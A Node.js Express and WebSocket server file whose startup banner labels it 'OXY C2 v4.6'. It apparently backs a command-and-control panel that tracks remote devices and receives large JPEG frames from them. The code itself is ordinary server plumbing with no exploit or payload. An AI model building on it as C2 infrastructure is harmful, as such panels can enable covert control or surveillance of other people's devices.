'use strict';
const http    = require('http');
const fs      = require('fs');
const path    = require('path');
const express = require('express');
const { WebSocketServer } = require('ws');
const state   = require('./state');

const PORT = parseInt(process.env.PORT || '5000', 10);
const DIST = path.join(__dirname, '..', 'client', 'dist');

const app = express();
app.use(express.json({ limit: '50mb' }));

// ── Static ────────────────────────────────────────────────────────────────────
app.use(express.static(DIST));

// ── REST API ──────────────────────────────────────────────────────────────────
app.use('/api', require('./routes/api'));

// ── SPA fallback ──────────────────────────────────────────────────────────────
app.get('*', (_, res) => {
  const index = path.join(DIST, 'index.html');
  if (fs.existsSync(index)) res.sendFile(index);
  else res.status(200).send('<h2>Run: npm run build --workspace=client</h2>');
});

// ── HTTP server ───────────────────────────────────────────────────────────────
const server = http.createServer(app);

// ── WebSocket servers ─────────────────────────────────────────────────────────
const WS_OPTS = {
  noServer:            true,
  maxPayload:          32 * 1024 * 1024, // 32 MB — covers large JPEG frames
  perMessageDeflate:   false,            // disabled: binary frames don't compress well
  clientTracking:      false,
};
const wssDevice    = new WebSocketServer(WS_OPTS);
const wssDashboard = new WebSocketServer(WS_OPTS);

const deviceHandler    = require('./ws/device');
const dashboardHandler = require('./ws/dashboard');

wssDevice.on('connection',    deviceHandler.handle);
wssDashboard.on('connection', dashboardHandler.handle);

// Route upgrades by path prefix
server.on('upgrade', (req, socket, head) => {
  const url = req.url || '';
  if (url.startsWith('/ws')) {
    wssDevice.handleUpgrade(req, socket, head,
      ws => wssDevice.emit('connection', ws, req));
  } else if (url.startsWith('/dashboard')) {
    wssDashboard.handleUpgrade(req, socket, head,
      ws => wssDashboard.emit('connection', ws, req));
  } else {
    socket.destroy();
  }
});

server.on('error', err => {
  console.error('[SERVER ERROR]', err.message);
  if (err.code === 'EADDRINUSE') {
    console.error(`Port ${PORT} already in use. Set PORT env var to change.`);
    process.exit(1);
  }
});

// ── Stale device cleanup every 15 s ──────────────────────────────────────────
setInterval(() => {
  const cutoff = Date.now() - 30_000;
  for (const [id, dev] of state.devices) {
    if (dev.lastSeen < cutoff) {
      state.devices.delete(id);
      try { require('./db').q.setOffline.run(Date.now(), id); } catch (_) {}
      state.broadcastAll({ type: 'device_offline', device_id: id, ts: Date.now() });
      console.log(`[STALE] ${id}`);
    }
  }
}, 15_000);

// ── Graceful shutdown ─────────────────────────────────────────────────────────
function shutdown() {
  console.log('\n[SHUTDOWN] Closing connections...');
  for (const { ws } of state.devices.values()) {
    try { ws.close(); } catch (_) {}
  }
  for (const ws of state.dashboards) {
    try { ws.close(); } catch (_) {}
  }
  server.close(() => process.exit(0));
  setTimeout(() => process.exit(0), 3000);
}
process.on('SIGTERM', shutdown);
process.on('SIGINT',  shutdown);

// ── Start ─────────────────────────────────────────────────────────────────────
server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n╔══════════════════════════════════════╗`);
  console.log(`║   OXY 🦷  C2  v4.6 —  port ${PORT}       ║`);
  console.log(`╠══════════════════════════════════════╣`);
  console.log(`║  Device WS  : /ws?device_id=XXX     ║`);
  console.log(`║  Dashboard  : /dashboard[?token=X]  ║`);
  console.log(`║  Panel      : http://HOST:${PORT}       ║`);
  console.log(`╚══════════════════════════════════════╝\n`);
});
